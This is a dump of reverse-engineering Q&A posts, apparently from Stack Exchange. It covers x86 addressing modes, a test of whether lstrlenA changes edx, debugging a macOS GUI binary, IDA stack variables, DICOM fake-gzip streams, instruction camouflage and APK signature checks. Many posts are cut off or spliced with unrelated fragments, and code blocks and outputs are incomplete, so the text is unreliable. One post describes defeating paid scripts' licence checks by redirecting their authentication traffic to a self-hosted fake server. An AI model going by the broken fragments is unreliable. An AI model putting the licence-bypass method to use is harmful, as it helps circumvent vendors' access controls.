<p>I'd like to understand them correctly, so here's my doubts:</p>

<p><a href=""https://i.stack.imgur.com/bChVS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/bChVS.png"" alt=""16bit Addressing Modes""></a></p>

<ul>
<li><code>mod == 0b11</code>: direct value contained in register is accessed, quite clear</li>
<li><code>mod != 0b11</code>: these are all indirect values, with optional 8 bit or 16 bit displacement to the final value, so we refer to the value contained in the computed address.</li>
</ul>

<p>My doubts:</p>

<ul>
<li>the 16 bit displacement is signed or unsigned? Eg <code>mov ax, [SI + 40000]</code> vs <code>mov ax, [SI - 1000]</code></li>
<li>what is exactly the case <code>mod == 0b00 &amp; R/M == 0b110</code>? It' just a indirect absolute value, eg <code>mov cl, [1234h]</code>, which masm compile as <code>8b0e3412: mov cx, WORD PTR ds:0x1234</code></li>
<li>are all these indirect addressing always relative to a segment? From the refence it sounds like that in 16 bit mode everything is always relative to DS, unless BP is contained in the indirect address, in that case SS is used (or a specific segment override is used). So basically <code>[BP+SI+10h]</code> always means <code>SS:[BP+SI+10h]</code> where SS segment is shifted by 4 bits to the left.</li>
<li>which is the exact role of 67h prefix in this context? If I use a 67h prefix it's like switching the table of 16 bit addressings with the 32 bit addressing and viceversa? (according to the current executing mode).</li>
<li>and what about 66h? Does it just change the ""size"" of data moved between 16 bits and 32 bits? Eg, forcing 32 bit operand size means that a 32 bit register will be selected and always 4 bytes of memory will be fetched from the indirect address and vice versa?</li>
</ul>

<p>And now the 32-bit addressing modes</p>

<p><a href=""https://i.stack.imgur.com/GbrxF.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GbrxF.png"" alt=""32 Addressing modes""></a></p>

<ul>
<li><code>mod == 0b11</code>: direct value, as for 16 bit, quite clear</li>
<li><code>mod == 0b00 &amp;&amp; R/M == 0b101</code>: raw value as for the 16 bits addressing case</li>
<li><code>mod != 0b11 &amp;&amp; R/M == 0b100</code>: the R/M doesn't specify a register but the SIB mode, so we can specify a base register + an index register + a scale value</li>
</ul>

<p>Here everything is enough clear, I was just wondering, as for 16 bits if displacement in 32 bits are signed or unsigned? SIB and displacement can be combined easily if I understand it correctly, eg <code>[EAX + EBX*2 + 10]</code> will generate a <code>mod == 01</code> with specific SIB byte and additional single byte for signed displacement. Are these values considered absolute in a flat memory space or segments must be considered here too?</p>
","<p>These are a lot of questions at once, i'll answer at least some of them. But, please not, unless you're writing an assembler or disassembler yourself, you shouldn't really go into the gory details of every single bit. And unless you have done a lot of programming in assembler, and reading and understanding disassembled code, you shouldn't even try to write an assembler or disassembler yourself.</p>

<p>Don't misunderstand me, writing your own assembler <em>can</em> be an interesting and educational experience. But the gory details aren't first thing you should learn to understand the concept of a processor and its assembly language.</p>

<p>That out of the way:</p>

<p>It doesn't matter if the 16 bit displacement is signed or unsigned. If it overflows, it overflows, and it's always cut to 16 bit. So if you add offset <code>0xfff0</code> to address <code>0x1234</code>, you'll get <code>0x1224</code> as result.  It doesn't really matter if you interpret this as ""<code>0xfff0</code> is equal to <code>-0x0010</code>, so we subtract <code>0x10</code> from <code>0x1234</code>"" or ""add <code>0xfff0</code> to <code>0x1234</code>, get <code>0x11224</code>, and strip the overflow bit"". Or, if you add <code>0x89ab</code> and <code>0x89ab</code>, you get <code>0x1356</code>. <code>0x11356</code> with the overflow bit stripped, to be precise. It doesn't matter if you take <code>0x89ab</code> as (decimal) <code>35243</code>, or <code>-30293</code>. The possible results - <code>35243+35243=70486</code>, <code>35243-30293=4950</code>, <code>-30293-30293=-60586</code> - do all have the same representation - <code>0x1356</code> - in 16 bit hex.</p>

<p>Yes, mod=<code>0b00</code> and R/M=<code>0b110</code> is just an indirect address. <code>mov cx, [1234h]</code> and <code>mov cx, WORD PTR ds:0x1234</code> are two ways of writing the same thing. Note i corrected your <code>cl</code> to <code>cx</code>; whether or not you use an 8-bit or 16-bit register is part of the instruction, not of the addressing mode. If you have a register, the size is clear from the register name, but in an instruction like <code>mov [1234h],5</code>, you don't know if the 5 is a byte, word, or dword value. <code>mov word ptr ds:1234h, 5</code> makes this clear.</p>

<p>Yes, all addresses are relative to the chosen segment - <code>ds</code> in most cases, <code>ss</code> if you use <code>bp</code>, and the given register if you use an explicit override prefix. Note there wasn't a way to index relative to <code>sp</code> in 16 bit mode, and <code>bp</code>, if used at all, was always the first register in <code>R1+R2</code> combinations, forcing <code>ss</code> to be used with <code>bp</code>. In 32 bit mode, more combinations are possible, and <code>[ebp+ebx]</code> uses <code>ss</code>, while <code>[ebx+ebp]</code> uses ds. (However, 32 bit mode also means protected mode, and in all but the most pathological cases, operating systems use the same selector values for <code>ss</code> and <code>ds</code>, and <code>cs</code> as well. See below).</p>

<p>So <code>[BP+SI+10h]</code> means <code>[SS:BP+SI+10h]</code>, which means <code>(SS&lt;&lt;4 + BP + SI + 10h)</code> on the address bus lines. Note that those 16 bit processors had 20 bits on the address bus, which means overflow could occur, and the overflow bit was cut off as well. So, FFF0:0010 and 0000:0000 are actually the same address on an 8086 - <code>00000</code> - since bit 20 from <code>100000</code> got cut off. On a 32 bit processor, this bit 20 actually exists. Which means some programs, that used that mechanism to obfuscate their copy protections, stopped working when the 80386 was introduced. Or would have, if IBM hadn't invented a mechanism around it - the nefarious A20 gate. Google for that if you're inclined to do so.</p>

<p>Prefixes <code>66h</code> and <code>67h</code> - ask someone else. Although i've been reading and writing assembler code for more than 20 years, i never had reason to learn the relation between hex bytes and processor instructions. See above. Well, i guess there are two exceptions: <code>90h</code> is <code>NOP</code>, and <code>cch</code> is <code>INT3</code>. And byte sequences like <code>PQRST</code>, <code>50h 51h 52h 53h 54h</code> are push-register instructions, which makes them useful for locating procedure starts.</p>

<p>In 32 bit modes, the displacements are just as ""signed"" or ""unsigned"" as in 16 bit modes. Just treat them as 32 bit values that get added, which might result in an overflow that's thrown away. </p>

<p>And of course, these values are considered relative to the ""segment""s as well. Just that 32 bit implies protected mode, which means the segments are called selectors, have different semantics, and get generally ignored by most application programmers.</p>

<h1>A word to segments, why they mattered, and don't (normally) matter any more:</h1>

<p>At first, when the 8086 was introduced, it was meant to replace the older 8080 processor (and the Z80, which was from a different company, compatible to the 8080, but better and more successful). The 8080 had 64 KB at a maximum altogether, so programmers had to squeeze everything - code, data, stack - into those 64 KB, and most of the time, a part of these 64 KB was used by hardware, so you had even less.</p>

<p>When the 8086, and the segment registers, were designed, someone at intel probably thought ""We're giving people much more space - 64 kb code AND 64 kb data AND 64 kb stack, so programs can be much larger; we can multitask between several programs, the operating system will manage the segment registers to assign space to each program, and every program can be so much bigger than today"".</p>

<p>But in fact, programs got much larger quickly, so the idea ""segment registers should concern the OS only"" wasn't ever used. Instead, programs had to juggle segments on their own, which was a major PITA for everybody from compiler builders to application programmers, and everybody had to learn - and know - about them to get anything done.</p>

<p>When 32 bit processors started, with 4 GB addressable in a <em>linear</em> fashion, segments suddenly became big enough that application programmers didn't have to care about them anymore. These days, juggling segments and assigning them to memory maps is strictly the task of the operating system, and due to protected mode, programs couldn't change them even if they wanted. So, what most operating systems do is provide one single flat block of memory to the program, and have <code>cs</code>, <code>ds</code>, <code>es</code> and <code>ss</code> map to that block identically. Your application just sees 4 GB of addressable memory (not all of that needs to be truly mapped to physical memory however), and it doesn't matter to the application anymore which segment registers it uses - <code>[DS:1234]</code> is the same as <code>[ES:1234]</code> is the same as <code>[SS:1234]</code> is the same as <code>[CS:1234]</code>.</p>

<p>The exception to this is the new registers <code>FS</code> and <code>GS</code>, for example, Windows uses <code>FS</code> for <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657%28v=vs.85%29.aspx"" rel=""noreferrer"">Structured Exception Handling</a>, and Linux uses <code>GS</code> for <a href=""http://wiki.osdev.org/Thread_Local_Storage"" rel=""noreferrer"">Thread local storage</a>. These segments are NOT mapped to the standard 4 GB block, but an application won't notice, since neither of these registers is ever used without an explicit prefix. (Note <code>ES</code> can not be used in the same way, since instructions like <code>stos[bwd]</code> and <code>movs[bwd]</code> use <code>ES:EDI</code> by default).</p>

","<p>Note: You'll probably get a better answer on stackoverflow, as your question is more about creating software than about reversing it.</p>

<p>First, you'll want to split your text file into blocks. You can do that looking for the <code>============= S U B R O U T I N E ============</code> comments that IDA emits, or checking the <code>sub_XXXX proc [near|far]</code>  and <code>sub_XXXX endp</code> markers.</p>

<p>Last, you need to layout the boxes and draw connections.

","<p>as hanno binder replied edx is not preserved by the function call lstrlena</p>

<p>you can easily deduce such things by instrumenting the code prior to and post the operation where your assumptions dont pan out to actual behaviour</p>

<p>a sample test code could look like this (in x64 you may need a seperate file for inline asm but since you say <strong>edx</strong> and not <strong>rdx</strong> inline asm inside a cpp file is fine)</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
// the vars are global so they are initialised to zero
int preeax,preebx,preecx,preedx,posteax,postebx,postecx,postedx;
void main (void) {
  printf(""does lstrlena change edx ? lets check\n"");
__asm {
  mov preeax,eax
  mov preebx,ebx
  mov preecx,ecx
  mov preedx,edx  
}
lstrlenA(""does this change edx\n"");
__asm {
  mov posteax,eax
  mov postebx,ebx
  mov postecx,ecx
  mov postedx,edx  
}
printf(
""preeax = %08x\tposteax = %08x\npreebx = %08x\tpostebx = %08x\n""
""preecx = %08x\tpostecx = %08x\npreedx = %08x\tpostedx = %08x\n"",
preeax,posteax,preebx,postebx,preecx,postecx,preedx,postedx);

<p>on compiling and running it </p>

<pre>
edxlstrlen.exe
does lstrlena change edx ? lets check
preeax = 00000026       posteax = 00000015
preebx = 7ffd8000       postebx = 7ffd8000

<h3>preedx = 004166a0       postedx = 004121b9</h3>
</pre>

<p>and as guntram commented to confirm you could disassemble lstrlena and grep for edx </p>

<pre><code>cdb -c ""uf kernel32!lstrlena;q"" cdb | grep edx
eax=00191eb4 ebx=7ffdb000 ecx=00000007 edx=00000080 esi=00191f48 edi=00191eb4

","<p>This specific pseudocode is actually regular C code because it doesn't access global variables and stack. You'll probably need to add some typedefs for basic types.

"Reversing a Mac OS X binary that appears to be non encrypted, backtrace just shows mach_msg_trap ()","815","","<p>Currently I have a binary that I am investigating.  The application is GUI / event driven, so that makes it difficult to set a break point.  I would like to set a break point on a certain button click, so I thought I would click the button, and then run a <code>backtrace</code> in GDB to see what functions were called when I clicked the button, but the output of the <code>bt</code> is just showing <code>mach_msg_trap()</code>, and a few other ""functions"" I suppose.  Does anyone know why I'm in the <code>mach_msg_trap()</code>  I am assuming it's some security feature implemented by Apple to prevent people from reversing their software, I just thought I would ask, as my googlefu didn't really return any tangible results.</p>

<p><img src=""https://i.stack.imgur.com/ZpuXV.png"" alt=""Screenshot of the GDB output""></p>
","<p>Well, my Mac fu isn't too strong, but I have terminal access to a Mac and will give it a wild shot, hoping to provide you with the insight required to proceed.</p>

<p><code>info sharedlibrary</code> on the GDB prompt will tell you details about the ranges of the shared libraries inside of which those functions reside. But we know that already from the function names.</p>

<p><a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Reference/ApplicationKit/Classes/NSApplication_Class/Reference/Reference.html""><code>NSApplication</code></a> comes from: Cocoa.</p>

<blockquote>
  <p>The <code>NSApplication</code> object maintains a list of all the <code>NSWindow</code> objects
  the application uses, so it can retrieve any of the application’s
  <code>NSView</code> objects.</p>
</blockquote>

<p>So my suggestion would be to start by starting the application</p>

<pre><code>gdb --args /path/to/binary optional arguments for program
</code></pre>

<p>and then set a breakpoint:</p>

<pre><code>b NSApplicationMain
</code></pre>

<p>(can be done inside <code>.gdbinit</code> obviously)</p>

<p>Then let the application continue. Break into it using <kbd>Ctrl</kbd>+<kbd>C</kbd>. Most likely the <code>backtrace</code> will be similar to what you saw before, but probably not up to <code>mach_msg_trap()</code>.</p>

<p>Then you go to one frame that uses a function which has a reference to the <code>NSApplication</code> instance. You can find the frame numbers with <code>bt</code>, obviously. So say:</p>

<pre><code>f 9
</code></pre>

<p>there you should be able to use GDB's <code>call</code>. Now, my Objective-C/C++ fu is even weaker than my Mac fu, but you can use</p>

<pre><code>set language
</code></pre>

<p>to list the available languages (which influences the syntax for <code>call</code>). So you should probably switch to one of the Objective-C/C++ alternatives as appropriate. On my Mac I have the following language options:</p>

<pre><code>(gdb) set language
The currently understood settings are:

local or auto    Automatic setting based on source file
ada              Use the Ada language
c                Use the C language
c++              Use the C++ language
asm              Use the Asm language
minimal          Use the Minimal language
fortran          Use the Fortran language
objective-c      Use the Objective-c language
objective-c++    Use the Objective-c++ language
java             Use the Java language
modula-2         Use the Modula-2 language
pascal           Use the Pascal language
scheme           Use the Scheme language
</code></pre>

<p><code>call</code> lets you call functions inside the context of the running program (and GDB has command line completion for symbols it knows of). So calling <code>mainWindow</code> of the <code>NSApplication</code> instance would appear as a good idea and then drilling down from there.</p>

<p>From there you should be able to figure out where your button comes into play and set the breakpoint, no?</p>

<p>Basically if you know a certain parameter of a certain call in the framework references your button (we'll assume it has a pointer somehow) you can use the</p>

<pre><code>break location if condition
</code></pre>

<p>syntax to make sure the breakpoint will only trigger for the button press. An alternative is the <code>ignore</code> command which will ignore X hits of a breakpoint and only trigger after that.</p>

"Creating my own custom structure in Ollydbg","814","","<p>In Ollydbg's hex dump window (lower left quadrant of CPU window) one can interpret data as structures, you can right-click on one or more bytes and see the options ""Decode as structure"" or ""Decode as pointer to structure"" (if more than one byte selected).  It then opens a new window with the data laid out vertically, with each data element shown as a row.  You can decode more than one instance.  </p>

<p>However, I'd like to add my own structure types.  Imagine I have this structure:</p>

<pre><code>typedef struct {
           double x,y,z;

           } model_type;
</code></pre>

<p>Below are some images showing the steps, with the fixed structure type ""COORD"" chosen.  Imagine I want to decode it instead with the above 'model_type' structure type.  Perhaps the answer lies in some command line or .ini manual setting?</p>

<p>Also, it would be nice if this could be used along with labels to identify struct elements in the disassembly window, for example [EAX+1C] could be interpreted as 'player.id' if one could somehow tell Olly EAX is the base pointer.  But perhaps I'm getting carried away...</p>

","<p>There is only actually one local variable in your function: x. This variable is located on the stack where you would expect it, at <code>ebp-4</code>. IDA is getting confused because this particular function, instead of pushing variables onto the stack before calling a function, is moving them instead. This tricks IDA into thinking those are local variables when they're actually just the locations at the top of the stack.</p>

<pre><code>mov     [esp+20h+var_1C], edx  &lt;===&gt; push edx
mov     [esp+20h+var_20], eax  &lt;===&gt; push eax
</code></pre>

<p>I can't definitively explain why gcc is doing this, but my guess is that you compiled without optimizations. This instruction layout might make debugging easier.</p>

<p>I think you're also confusing calling conventions with local variable cleanup. Every function needs to clean up its own local variable area. Your main() function is doing that with the <a href=""https://stackoverflow.com/questions/5474355/about-leave-in-x86-assembly""><code>leave</code></a> instruction. Calling conventions are related to cleaning up the <strong>parameters</strong> passed to a function.</p>

"Tools to show the registers and memory locations in use during execution?","813","","<p>I am looking for something that is like <code>gdb</code> but maybe with a GUI that can show all registers current values ans the current values of memory and things on the stack?  Freeware is preferred.  I have a free version of IDA and anything that comes with Kali Linux.  It is an ELF file that is stripped.</p>
","<p>Perhaps you should try <code>DDD</code>. It's a <code>GUI</code> for <code>GDB</code> with lots of great features that simplify debugging for beginners &amp; experts too. I have to warn you though, if your binary is stripped what matters most is the methodology. Most debuggers are extremely efficient if debug symbols are present (in case of an <code>ELF</code>, the <code>DWARF</code> is what you need to check). Without debug symbols all you can do is go through the code step by step, setting breakpoints at locations where the assembly code seems to be interesting. </p>

<p>You must know that reverse engineering is a challenge, not an easy task, and that there's no such thing as a magic tool. All the tools rely on algorithm which are not, unfortunately, flawless. Disassemblers can fail, decompilers can stumble upon patterns they can't turn into high-level code, and so on and so forth.</p>

<p>You have to develop a methodology which you'll have to adapt with experience. That's how you'll be able to forge good reversing skills. Meanwhile, the forum is open for questions, hopefully as precise &amp; concise as the answers.</p>

"Draw circuit of a multilayer PCB","811","","<p>I have found a multilayer PCB of which I need to draw the circuit. At first, I tried to find the circuit on the internet using part numbers, but I did not get any result. The PCB is from a very old alarm installation.</p>

","<p>There are <a href=""http://www.pcbreverseengineering.com/"" rel=""nofollow"">comprehensive tools</a> that can do precisely this. Part of the software that comes with them allows you to place part numbers between pads and have the circuit diagram automatically generated for you.

<p>a1 is an address location
a2 is the length of the file to hash
zero I renamed as it always sends zero for whatever reason.</p>

<p>Now for the questions:</p>

<ol>
<li>First and foremost, is this a standard algorithm like CRC or
something? </li>
<li>Is there a reason for the v4 and v5 variables to be -1640531527?</li>
<li>What is the purpose of <code>(*(_BYTE *)(content + 7) &lt;&lt; 24)</code> isn't a byte only 8 bits, so won't it be 0 every time? I looked up the order of operations and it seems that the casting is first then the bit operations, so it means it converts it to the 8th byte in the file and bit shifts it 24 bits right? why?</li>
<li>Why are some bits signed and some unsigned, and would it change the outcome if there is a mix?</li>
</ol>

<p>Those are most of my questions, I understand it is going through all the bytes and getting a total to figure out the ""hash"" for the file, I understand that the switch case is taking care of the situation of the file not being exactly divisible by 12. I think once I understand the logic behind the bitwise operations then it will be more clear.</p>
","<p>-1640531527 is hexadecimal '0x9e3779b9'.
This number is used in boost hash function.

<p>The obfuscation technique claimed to be used here is called <em>instruction
camouflage</em> (see this <a href=""http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.125.5028"" rel=""nofollow"">paper</a>). Can someone explain what is it and how does it works ?</p>
","<p>Instruction camouflage is an obfuscation technique against simple naive static
analysis of the binary. The binary program is composed of two parts:</p>

<ul>
<li>A decoder</li>
<li>An encoded payload</li>
</ul>

<p>When executed, the binary first goes to the decoder and decode the
payload that unveil the real assembly code. At the end, the decoder
jumps to the decoded payload and execute the code.</p>

<p>The benefit of this technique is that statically disassembling the
binary will not give you hints on what is really doing the program.
Somehow, it forces the analyst to execute first the decoder part (for
real or symbolically) and, then, look at the decoded payload.</p>

<p>In the proposed example, the decoder part is the following:</p>

<p>You can see that there is a loop between <code>0x8048418</code> and <code>0x804841c</code>
which apply a xor <code>0xaa</code> to each byte in the payload (from <code>0x804841e</code>
to  <code>0x804841e + 0x25 = 0x8048443</code>, the loop counter is <code>%ecx</code>).</p>

<p>So, the best way to know what is done in the payload is to take <code>gdb</code>
and to set a breakpoint after the decoder has completed his task:</p>

","<p>It's a SPI flash memory so most decent SPI flash programmers should do. They can be found below 30 USD. If you have a decent micro controller development board already you can probably program and read this chip easily. For instance the Arduino platform has SPI libraries. The pin pitch is 1.3 mm so you should be able to attach to the chip without even desoldering it using decent grabber probes.</p>

<p>Have you beep tested the board to see if any test points or headers connect to the flash memory pins?</p>

"How to strip more than symbols?","785","","<p>I've noticed that, even after stripping symbols from my executable, class names and their methods are still included at the end of the executable file.</p>

class Clingons
{

"What kind of compression/obfuscation algorithm is this?","784","","<p>I have a couple of streams that look pretty odd within a <code>DICOM</code> file. In a few words, <a href=""http://medical.nema.org/medical/dicom/current/output/chtml/part05/chapter_7.html#sect_7.1.2"" rel=""nofollow noreferrer"">DICOM</a> is very close to what <em>binary XML</em> would look like. Almost all of the information from those DICOM files are straighforward and can be read and interpreted nicely with <a href=""http://dcmtk.org/"" rel=""nofollow noreferrer"">DCMTK</a> and/or <a href=""http://sourceforge.net/projects/gdcm/"" rel=""nofollow noreferrer"">GDCM</a>.</p>

<p>However there are two binary fields stored within the end of the file that looks like <em>private</em> encoded information. Since DICOM is mostly for <em>interoperability</em> in between system, vendors are actually storing there own internal file format within one of the field of the DICOM file (declared as private field, much like what would people in the TIFF world would do). In my past experience, the encoding was trivial (plain <code>struct</code> stored as binary), see <a href=""https://github.com/malaterre/GDCM/blob/master/Applications/Cxx/gdcmdump.cxx#L67"" rel=""nofollow noreferrer"">here</a> or <a href=""https://github.com/malaterre/GDCM/blob/master/Source/DataStructureAndEncodingDefinition/gdcmCSAHeader.cxx#L986"" rel=""nofollow noreferrer"">here</a> for example.</p>

<p>Now if I extract the binary blobs from the DICOM file (debian/jessie amd64), here is what I see :</p>

<pre><code>$ gdcmraw -t 7101,1000 input.dcm file1000.gz
$ gdcmraw -t 7101,1002 input.dcm file1002.gz
$ file file1000.gz file1000.gz: gzip compressed data, max compression, from FAT filesystem (MS-DOS, OS/2, NT)

$ gunzip file1000.gz

gzip: file1000.gz: invalid compressed data--format violated
</code></pre>

<p>However <code>gunzip</code> is not capable of decompressing them. Could someone with more gzip knowledge please check if those files are actually gzip compressed ? It looks like it's possible to decompress them because in the medical industry we tend to re-use code whenever possible. For example a well known MRI vendor is also using <code>gzip</code> compressed stream to store its private file format, see <a href=""https://github.com/malaterre/GDCM/blob/master/Source/DataStructureAndEncodingDefinition/gdcmPDBHeader.cxx#L25"" rel=""nofollow noreferrer"">here</a> for example (full thread <a href=""https://groups.google.com/d/msg/comp.protocols.dicom/mxnCkv8A-i4/sHcN_oFeNekJ"" rel=""nofollow noreferrer"">here</a>).</p>

<p>The obfuscation should be pretty trivial too because it needs to pass medical industry clearance. From past experience, I've only seen byte reversing being used or simple incremental XOR.</p>

<p>I've uploaded come of the files here:</p>

<ul>
<li><a href=""https://github.com/malaterre/MRPicker"" rel=""nofollow noreferrer"">https://github.com/malaterre/MRPicker</a></li>
</ul>

<p>The image can be extracted nicely, so I suspect only a few extra private vendor information (metadata only) is stored within this field (MRI serial number...).</p>

<p>To be more specific, the fake <code>gzip</code> stream comes in pair eg (<code>file1000.gz</code> &amp; <code>file1002.gz</code> were taken from the same DICOM file). From another DICOM file I found that the second fake gzip stream was (bitwise) identical to <code>file1002.gz</code>, so I only uploaded <code>file1000_other1.gz</code> (same goes for <code>file1000_other2.gz</code>, <code>file1000_other3.gz</code> and <code>file1000_other4.gz</code>). So maybe <code>file1002.gz</code> is a bit special here. Since I do not have physical access to the MRI workstation that produces those images, I can only do brute-force approach here.</p>

<hr>

<p>Update: I did check that the files are not simply a deflate codestream with broken header using <a href=""https://github.com/malaterre/MRPicker/blob/master/unz.py"" rel=""nofollow noreferrer"">unz.py</a> and <a href=""https://github.com/malaterre/MRPicker/blob/master/runme.sh"" rel=""nofollow noreferrer"">runme</a> (<code>binwalk -X</code> did not reveal anything either). So they are not direct simple <code>gzip</code> files.</p>

<p>Update2: I did try to read the stream backwards using this <a href=""https://github.com/malaterre/MRPicker/blob/master/reverse.cxx"" rel=""nofollow noreferrer"">code</a> but again this still does not look like a deflate stream.</p>

<p>Update3: So far, all streams I found have proper gzip header, and they all finish with 4 zeros (0) bytes, just like any valid gzip. I should be able to recover the file using the <a href=""https://stackoverflow.com/a/11557033/136285"">last 4 bytes</a> since they are used to store a crc32 (as per gzip RFC).</p>

<p>Update5: DICOM can only stores even-bytes length as attribute. One fake-gzipped stream was actually padded to the next even length, but the actual length reported in 7101,1001 was odd (10765). I've updated <code>file1000_other4.gz</code> to have the proper length (the trailing bytes are not anymore <code>03 00 00 00</code>, but <code>0B 03 00 00</code>)</p>
","<p>The gzip headers are valid, but the deflate compressed data format is violated almost immediately, within less than ten bytes in for all of the files.</p>

<p>For all of the example files provided, the first deflate block is a dynamic block which has an oversubscribed code lengths code.  That means that a Huffman code required to decode the code lengths for that block is itself invalid.  This immediately halts the decompression, since no further progress can be made.</p>

<p>The last four bytes may not be what you think they are.  The last four bytes of a valid gzip file is the length of the uncompressed data, modulo 2<sup>32</sup>, in little-endian order.  Those lengths do not seem correlated to the file sizes.  For example <code>file1010.gz</code>'s last four bytes are <code>0b 03 00 00</code>.  It's length is 10766.  So 10766 bytes decompresses to 779 bytes?  I don't think so.  So the second-to-last four bytes are likely also not what you would expect there for a gzip stream, i.e. likely not a CRC.</p>

<p>The data after the header appears to be random in all cases (pretty flat histogram over 0..255), and is itself mostly incompressible, which is consistent with it being compressed data.</p>

<p>I tried decompressing from all bit offsets starting after the gzip header to the end, but no joy.  This rules out some sort of header followed by valid deflate data.</p>

<p>Basically they are encoded with Base64 then SSL, but I have no idea how to do the SSL portion. They are used with a program called '<em>Bot of Legends</em>', and someone told me that it is possible to break the encryption by dumping the decryption function of said program and using that to get the SSL key. But, I have no clue where to even start on that. </p>

<p>Basically, these scripts work by connecting to an authentication server that is coded into the script, and I have gotten a few on my own by sniffing the traffic to their authentication server from network packets to get their server link and essentially created my own authentication server with Apache, then redirected the network traffic that goes to their server to my own from the script to get the script validated response. </p>

<p>For some scripts that have stronger encryption, its not that easy and I would have to get to the source code to remove the coding that runs the authentication server checks. Up until a few days ago I had no knowledge on how lua coding worked and how to even compute how authentication server checks could be even possible for coding in a simple text file due to lua obfuscation. </p>

"Unknown Mac OSX 10.10 HFS+ compression","778","","<p>I'm trying to decompress a Mach-O binary which has been compressed using one of the compression algorithms in Mac 10.10's HFS+ implementation. Basically the file has the ""com.apple.decmpfs"" attribute on it, which says that it is compression type 8. Then the compressed contents of the file are stored in the file's resource fork.</p>

<p>It doesn't seem to have any identifiable header on it. Does anyone recognize it, or have any ideas what it might be? Below is a dump of the first 0x200 bytes of the compressed version of <code>/bin/bash</code>, and the first 0x200 bytes of the same file as viewed under Mac OS.</p>

<p>The Mach-O header (<code>CF FA ED FE</code>) and some executable's strings (e.g. <code>__PAGEZERO</code>) can be seem in the compressed version.</p>

","<p>OK... it seems to be LZVN compression. Following on from Igor's suggestions I ran <code>kextstat</code> on my Mac, however that only listed:</p>

<ul>
<li><code>com.apple.AppleFSCompression.AppleFSCompressionTypeZlib</code></li>
<li><code>com.apple.AppleFSCompression.AppleFSCompressionTypeDataless</code> </li>
</ul>

<p>Looking at the strings inside the 'dataless' compression it turned out to be type 5: <a href=""https://github.com/dimones/Clevo-W370ET-Mavericks/blob/master/Extensions/AppleFSCompressionTypeDataless.kext/Contents/Info.plist#L53"" rel=""nofollow"">AppleFSCompressionTypeDataless.kext</a>. Searching for the same string with type 8, I found this log:</p>

"How to get a entry point of loaded process with IDA Pro and WinDbg as a debugger?","775","","<p>I'm using IDA Pro and WinDbg as a debugger. So I loaded an executable process into it.

<p>Sorry, I'm new to IDA. What am I doing wrong?</p>
","<p>You need to switch to a different command line. Currently, you're using the WinDbg command line, which allows you to send commands to WinDbg instead of IDAPython:</p>

"What are the steps, to extract an unknown archive file in this case?","773","","<p>I've never did something like this before, but I have programming experiences. There are two files:
<code>data00.big</code> and <code>data01.big</code>, which I would like to extract.</p>

<p>I've tried Dragon Unpacker, which can unpack <code>.big</code> files. But it seems, that they aren't valid <code>.big</code> files, just some kind of custom archive, which is named <code>.big</code>, so it seems, I have to write my own unpacker.</p>

<p>The archive was created in 1999. As far as I know, it contains mostly graphic and sound files.</p>

<p><code>data00.big</code> opened in hexeditor:</p>

<p><a href=""https://i.stack.imgur.com/RqJq8.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RqJq8.png"" alt=""hex""></a></p>
","<p>I see filenames. That is an extremely important starting point - if I did not, I'd have to assume the file is encrypted, compressed, or does not use filenames at all, which are all harder to unpack.</p>

<p>For the moment, skip the header ""BigFile"" and the immedtaly following data and concentrate on these filenames alone.</p>

<p>If the filenames have different lengths, you can verify if these are records of a fixed length (where the filenames are padded), or have different lengths, in which case there may be a ""length"" value - or not. A length value may not be necessary, the file names can be terminated by a special value such as <code>0</code>.</p>

<p>There are other values too - usually, in an archive format, these are file lengths. There can also be a file <em>offset</em> - but from where? (E,g., start of file, start of archive data excluding the header, start of actual data, and so on.) A per-file offset is not required if all files appear end to end, then the lengths are enough.</p>

<p>There may be additional information per file record; I have encountered flags, file type codes, date/time stamps, checksums, and more. Usually, after you found out what the most important bits mean, the remaining data makes sense as well.</p>

<p>To find out what byte means what, write a small program to print out each file name and all of its associated data, up to the next file entry. Don't bother with trying to get a correct 'file count' yet. Most likely this is one of the numbers in the header at the start; you can go back to that when you got the file list details right. For starters, just write out the data of the first few dozen of entries.</p>

<p>Keep in mind that you cannot tell right away if extra data comes before or after the file name! Or even both.</p>

<p>File sizes and offsets are usually 4 byte numbers; the endianness can be trivially checked (all small numbers are good, all conspicuously large must be an error). Similar but varying numbers may be file sizes. A number that keeps increasing must be an absolute file offset. Numbers that always contain data in some binary positions and none in others can be flags of some kind. Large values, hovering around similar values, can very well be a time stamp. Finally, random looking full 4 byte numbers might be a checksum.</p>

<p>If you get consistent good results in decoding the data for the test set of file records, find the start and end of the list by trial and error. It's here that you may discover that the ""end"" of a record is actually the <em>start</em> of the next one.</p>

<p>This will tell you (1) the number of records, and (2) the start of the record data. You can inspect if these numbers appear in the ""BigFile"" header - particularly the number of records would be useful.</p>

<p>If you can locate numbers that ""look"" like they could be file lengths and (optionally) offsets, you can write a test program to extract a single file. This may also help with determining the order of data; if you extract a file that is clearly a PNG image but its associated filename is ""config.txt"", you have something in the wrong order.</p>

<p>An alternative to the above is focussing on the <em>data</em> first. Some file types, such as PNG images, should be entirely self containing: if you find the start of a PNG image, you can immediately extract it in its entirety by looking for the tell-tale <code>IEND</code> marker. Then you have a reliable file length and so you can search for a match in the file record set.</p>

","<p>The classic, compiler theoretic answer to this question is to build a control flow graph and then do a graph analysis to identify natural loops.

<p>Even if I just re-sign the official APK that I downloaded straight from the Play Store, it detects that it has been tampered with, so it must either be checking file sizes or signatures. I've grepped all the smali files for things like ""signature"" and ""getPackageInfo"" to try and find where it's getting the signature from, but I cannot find anything.</p>

<p>What other methods are there to figure out if the APK has been re-signed, even when nothing else has been altered? It is not using SafetyNet.</p>
","<p>Your best bet is to just start reading through the code and see everything it does. It almost certainly is checking signatures, just in a way that your search missed. That could be because it is using an API you didn't search for, or because the code is obfuscated, or because you messed up the search. Note that there are a lot of APIs that could be used to get information about the app. For example, it could be using the JarFile getResource() API. The most reliable method is to just read the code.</p>

<p>Also don't forget to look in the native code, if any! You can check whether the app is using native code by looking in the libs folder. This is a bit of a longshot though, since most programmers are too lazy to write native code. If they are doing the checks in native code, it's probably an off the shelf packer/obfuscator.</p>

<p>For completeness, I should mention that there are several features of an app that depend on its signature. For example, it could be using a signature based permission or a shared userid, each of which would break if you resigned the app. I've never heard of these being used for tamper detection though.</p>

